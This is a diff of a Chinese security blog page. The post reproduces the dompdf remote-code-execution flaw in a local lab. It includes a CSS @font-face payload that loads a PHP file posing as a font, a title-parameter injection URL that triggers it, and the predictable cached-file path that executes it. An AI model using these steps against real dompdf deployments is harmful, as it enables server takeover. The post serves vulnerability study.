@@ -20,13 +20,14 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="这次的漏洞是dompdf这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。 最开始这个漏洞并不是rce，而是xss。 首先是两个配置： 在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。 1234567891011121314151617181920&#x2F;*** Enable embedded PHP** If this setting is set to true t">
+    <meta name="description" content="这次的漏洞是dompdf这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。 最开始这个漏洞并不是rce，而是xss。 首先是两个配置： 在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。 1234567891011121314151617181920&#x2F;*** Enable embedded PHP** If this setting is set to tr">
 <meta property="og:type" content="article">
 <meta property="og:title" content="dompdf 0day(RCE)复现">
 <meta property="og:url" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="郁涛丶&#39;s Blog">
-<meta property="og:description" content="这次的漏洞是dompdf这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。 最开始这个漏洞并不是rce，而是xss。 首先是两个配置： 在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。 1234567891011121314151617181920&#x2F;*** Enable embedded PHP** If this setting is set to true t">
+<meta property="og:description" content="这次的漏洞是dompdf这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。 最开始这个漏洞并不是rce，而是xss。 首先是两个配置： 在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。 1234567891011121314151617181920&#x2F;*** Enable embedded PHP** If this setting is set to tr">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319110855454.png">
 <meta property="og:image" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111650926.png">
 <meta property="og:image" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111921628.png">
 <meta property="og:image" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319112233859.png">
@@ -35,7 +36,7 @@
 <meta property="article:author" content="郁涛丶">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111650926.png">
+<meta name="twitter:image" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319110855454.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
@@ -218,7 +219,11 @@
     
     <!-- 谷歌统计  -->
     
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="郁涛丶's Blog" type="application/atom+xml">
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="郁涛丶's Blog" type="application/atom+xml">
 </head>
 
     <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
@@ -342,7 +347,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -503,45 +508,46 @@
 <p>首先是两个配置：</p>
 <p>在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Enable embedded PHP</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* If this setting is set to true then DOMPDF will automatically evaluate</span></span><br><span class="line"><span class="comment">* embedded PHP contained within  ...  tags.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* ==== IMPORTANT ====</span></span><br><span class="line"><span class="comment">* Enabling this for documents you do not trust (e.g. arbitrary remote html</span></span><br><span class="line"><span class="comment">* pages) is a security risk. Embedded scripts are run with the same level of</span></span><br><span class="line"><span class="comment">* system access available to dompdf. Set this option to false (recommended)</span></span><br><span class="line"><span class="comment">* if you wish to process untrusted documents.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* This setting may increase the risk of system exploit. Do not change</span></span><br><span class="line"><span class="comment">* this settings without understanding the consequences. Additional</span></span><br><span class="line"><span class="comment">* documentation is available on the dompdf wiki at:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$isPhpEnabled</span> = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
-
 <p>远程资源加载：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Enable remote file access</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* If this setting is set to true, DOMPDF will access remote sites for</span></span><br><span class="line"><span class="comment">* images and CSS files as required.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* ==== IMPORTANT ====</span></span><br><span class="line"><span class="comment">* This can be a security risk, in particular in combination with isPhpEnabled and</span></span><br><span class="line"><span class="comment">* allowing remote html code to be passed to $dompdf = new DOMPDF(); $dompdf-&gt;load_html(...);</span></span><br><span class="line"><span class="comment">* This allows anonymous users to download legally doubtful internet content which on</span></span><br><span class="line"><span class="comment">* tracing back appears to being downloaded by your server, or allows malicious php code</span></span><br><span class="line"><span class="comment">* in remote html pages to be executed by your server with your account privileges.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* This setting may increase the risk of system exploit. Do not change</span></span><br><span class="line"><span class="comment">* this settings without understanding the consequences. Additional</span></span><br><span class="line"><span class="comment">* documentation is available on the dompdf wiki at:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$isRemoteEnabled</span> = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
-
-<p>查看这个是否开启可以xss构造：<code>?t=aa&lt;link rel=stylesheet href=&quot;xxxxxxx/test.css&quot;&gt;&amp;pdf</code>，来包含一个外部css，判断这个选项是否开启。</p>
+<p>查看这个是否开启可以xss构造：<code>?t=aa&lt;link rel=stylesheet href="xxxxxxx/test.css"&gt;&amp;pdf</code>，来包含一个外部css，判断这个选项是否开启。</p>
 <p>若开启，dompdf即允许通过font-face 的css来加载自定义的字体。</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;exploitfont&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;http://localhost:9001/xxxx.ttf&#x27;</span>);</span><br><span class="line">    <span class="attribute">font-weight</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">    <span class="attribute">font-style</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
 <p>使用外部字体的时候，dompdf将其存在<code>/lib/fonts</code>的目录中，并在<code>dompdf_font_family_cache.php</code>using中添加相应的条目<code>saveFontFamilies()</code>，这个函数将 dompdf 已知的字体编码为 PHP 数组，以及稍后查找它们所需的信息。：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Saves the stored font family cache</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The name and location of the cache file are determined by &#123;<span class="doctag">@link</span></span></span><br><span class="line"><span class="comment"> * FontMetrics::CACHE_FILE&#125;. This file should be writable by the</span></span><br><span class="line"><span class="comment"> * webserver process.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> FontMetrics::loadFontFamilies()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveFontFamilies</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// replace the path to the DOMPDF font directories with the corresponding constants (allows for more portability)</span></span><br><span class="line">    <span class="variable">$cacheData</span> = sprintf(<span class="string">&quot;&lt;?php return function (%s, %s) &#123;%s&quot;</span>, <span class="string">&#x27;$fontDir&#x27;</span>, <span class="string">&#x27;$rootDir&#x27;</span>, PHP_EOL);</span><br><span class="line">    <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;return array (%s&quot;</span>, PHP_EOL);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;fontLookup <span class="keyword">as</span> <span class="variable">$family</span> =&gt; <span class="variable">$variants</span>) &#123;</span><br><span class="line">        <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;  &#x27;%s&#x27; =&gt; array(%s&quot;</span>, addslashes(<span class="variable">$family</span>), PHP_EOL);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$variants</span> <span class="keyword">as</span> <span class="variable">$variant</span> =&gt; <span class="variable">$path</span>) &#123;</span><br><span class="line">            <span class="variable">$path</span> = sprintf(<span class="string">&quot;&#x27;%s&#x27;&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">            <span class="variable">$path</span> = str_replace(<span class="string">&#x27;\&#x27;&#x27;</span> . <span class="keyword">$this</span>-&gt;options-&gt;getFontDir(), <span class="string">&#x27;$fontDir . \&#x27;&#x27;</span>, <span class="variable">$path</span>);</span><br><span class="line">            <span class="variable">$path</span> = str_replace(<span class="string">&#x27;\&#x27;&#x27;</span> . <span class="keyword">$this</span>-&gt;options-&gt;getRootDir(), <span class="string">&#x27;$rootDir . \&#x27;&#x27;</span>, <span class="variable">$path</span>);</span><br><span class="line">            <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;    &#x27;%s&#x27; =&gt; %s,%s&quot;</span>, <span class="variable">$variant</span>, <span class="variable">$path</span>, PHP_EOL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;  ),%s&quot;</span>, PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$cacheData</span> .= <span class="string">&quot;);&quot;</span> . PHP_EOL;</span><br><span class="line">    <span class="variable">$cacheData</span> .= <span class="string">&quot;&#125;; ?&gt;&quot;</span>;</span><br><span class="line">    file_put_contents(<span class="keyword">$this</span>-&gt;getCacheFile(), <span class="variable">$cacheData</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>如果不能使用字体缓存索引，直接使用字体缓存是否可行？看下dompdf如何如何注册新字体(部分，具体在<a target="_blank" rel="noopener" href="https://github.com/dompdf/dompdf/blob/v1.2.0/src/FontMetrics.php#L174">这里</a>)：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $style</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $remoteFile</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> resource $context</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerFont</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$remoteFile</span>, <span class="variable">$context</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="variable">$fontname</span> = mb_strtolower(<span class="variable">$style</span>[<span class="string">&quot;family&quot;</span>]);</span><br><span class="line">   <span class="variable">$styleString</span> = <span class="keyword">$this</span>-&gt;getType(<span class="string">&quot;<span class="subst">&#123;$style[&#x27;weight&#x27;]&#125;</span> <span class="subst">&#123;$style[&#x27;style&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$fontDir</span> = <span class="keyword">$this</span>-&gt;options-&gt;getFontDir();</span><br><span class="line">   <span class="variable">$remoteHash</span> = md5(<span class="variable">$remoteFile</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$prefix</span> = <span class="variable">$fontname</span> . <span class="string">&quot;_&quot;</span> . <span class="variable">$styleString</span>;</span><br><span class="line">   <span class="variable">$prefix</span> = preg_replace(<span class="string">&quot;[\\W]&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$prefix</span>);</span><br><span class="line">   <span class="variable">$prefix</span> = preg_replace(<span class="string">&quot;/[^-_\\w]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$prefix</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$localFile</span> = <span class="variable">$fontDir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$prefix</span> . <span class="string">&quot;_&quot;</span> . <span class="variable">$remoteHash</span>;</span><br><span class="line">   <span class="variable">$localFile</span> .= <span class="string">&quot;.&quot;</span>.strtolower(pathinfo(parse_url(<span class="variable">$remoteFile</span>, PHP_URL_PATH), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Download the remote file</span></span><br><span class="line">   <span class="keyword">list</span>(<span class="variable">$remoteFileContent</span>, <span class="variable">$http_response_header</span>) = @Helpers::getFileContent(<span class="variable">$remoteFile</span>, <span class="variable">$context</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$localTempFile</span> = @tempnam(<span class="keyword">$this</span>-&gt;options-&gt;get(<span class="string">&quot;tempDir&quot;</span>), <span class="string">&quot;dompdf-font-&quot;</span>);</span><br><span class="line">   file_put_contents(<span class="variable">$localTempFile</span>, <span class="variable">$remoteFileContent</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$font</span> = Font::load(<span class="variable">$localTempFile</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable">$font</span>) &#123;</span><br><span class="line">       unlink(<span class="variable">$localTempFile</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$font</span>-&gt;parse();</span><br><span class="line">   <span class="variable">$font</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">   unlink(<span class="variable">$localTempFile</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Save the changes</span></span><br><span class="line">   file_put_contents(<span class="variable">$localFile</span>, <span class="variable">$remoteFileContent</span>);</span><br><span class="line">   <span class="keyword">$this</span>-&gt;saveFontFamilies();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>可以看到，新缓存字体的名字是确定了的，<code>字体名称</code>，<code>样式</code>，<code>MD5(RemoteURL)</code>这三个组成，比如，url是这样:<code>http://attacker.local/test_font.ttf</code>，样式为normal，那么将被存为：<code>testfont_normal_d249c21fbbb1302ab53282354d462d9e.ttf</code></p>
-<p>![image-20220319110855454](dompdf 0day(RCE)复现/image-20220319110855454.png)</p>
+<figure>
+<img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319110855454.png" alt="image-20220319110855454"><figcaption aria-hidden="true">image-20220319110855454</figcaption>
+</figure>
 <p>那么这样的话，即使没有目录遍历的洞，也可以不用爆破直接知道文件名。</p>
 <p>当然，上传的字体必须有效，必须能被加载和解析。</p>
 <p>但是源码有个问题，他判断字体文件是否正常，是基于上传文件的文件头，类似Linux的判断方式，而不管文件后缀，那么即使使用其他后缀，只要符合<code>ttf</code>的文件头标准，仍可被解析。</p>
 <p>下面是构造的<code>css</code>以及<code>ttf(php)</code>：</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;exploitfont&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;http://localhost:9001/exploit_font.php&#x27;</span>);</span><br><span class="line">    <span class="attribute">font-weight</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">    <span class="attribute">font-style</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111650926.png" alt="image-20220319111650926"></p>
+<figure>
+<img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111650926.png" alt="image-20220319111650926"><figcaption aria-hidden="true">image-20220319111650926</figcaption>
+</figure>
 <p>至于ttf文件结构？网上一堆。。。</p>
 <p>下面直接使用<a target="_blank" rel="noopener" href="https://github.com/positive-security/dompdf-rce">github</a>的来复现：</p>
 <p>开启应用和exp：</p>
-<p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111921628.png" alt="image-20220319111921628"></p>
+<figure>
+<img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111921628.png" alt="image-20220319111921628"><figcaption aria-hidden="true">image-20220319111921628</figcaption>
+</figure>
 <p>使用exploit_font.php触发：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9000/index.php?pdf&amp;title=&lt;link rel=stylesheet href=&#x27;http://localhost:9001/exploit.css&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
 <p>之后访问：<code>http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php</code></p>
-<p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319112233859.png" alt="image-20220319112233859"></p>
+<figure>
+<img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319112233859.png" alt="image-20220319112233859"><figcaption aria-hidden="true">image-20220319112233859</figcaption>
+</figure>
 <p>成功触发。</p>
 <p>u1s1这个洞完全可以出个CTF题，，</p>
 <p>参考链接：</p>
 <blockquote>
-<p>  <a target="_blank" rel="noopener" href="https://positive.security/blog/dompdf-rce">https://positive.security/blog/dompdf-rce</a></p>
-<p>  <a target="_blank" rel="noopener" href="https://github.com/positive-security/dompdf-rce">https://github.com/positive-security/dompdf-rce</a></p>
-<p>  <a target="_blank" rel="noopener" href="https://juejin.cn/post/7010064099027451912">ttf文件格式</a></p>
+<p>https://positive.security/blog/dompdf-rce</p>
+<p>https://github.com/positive-security/dompdf-rce</p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7010064099027451912">ttf文件格式</a></p>
 </blockquote>
 
     </article>
@@ -1026,487 +1032,17 @@
         
         
         
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
     
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
         
         
         
@@ -1643,7 +1179,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 64
+        Total : 66
         </div>
         <!-- search  -->
         
@@ -1672,6 +1208,18 @@
             <div class="archive-year"> 2022 </div>
             <ul class="year-list">
             
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/28</span>
+            <a class="archive-post-title" href="/2022/06/28/Latex/">Latex使用笔记</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span>
+            <a class="archive-post-title" href="/2022/05/25/Powershell/">Powershell</a>
+        </li>
+    
         
         <li class="archive-post-item">
             <span class="archive-post-date">05/23</span>
@@ -2104,6 +1652,11 @@
                 Java
             </span>
         
+            <span class="sidebar-tag-name" data-tags="内网">
+                <span class="iconfont-archer">&#xe606;</span>
+                内网
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="免杀">
                 <span class="iconfont-archer">&#xe606;</span>
                 免杀
@@ -2139,19 +1692,14 @@
                 Linux
             </span>
         
-            <span class="sidebar-tag-name" data-tags="内网">
+            <span class="sidebar-tag-name" data-tags="OS">
                 <span class="iconfont-archer">&#xe606;</span>
-                内网
+                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="汇编">
                 <span class="iconfont-archer">&#xe606;</span>
                 汇编
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="OS">
-                <span class="iconfont-archer">&#xe606;</span>
-                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="WriteUp">
@@ -2167,6 +1715,16 @@
             <span class="sidebar-tag-name" data-tags="Win32">
                 <span class="iconfont-archer">&#xe606;</span>
                 Win32
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ML">
+                <span class="iconfont-archer">&#xe606;</span>
+                ML
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Math">
+                <span class="iconfont-archer">&#xe606;</span>
+                Math
             </span>
         
     </div>
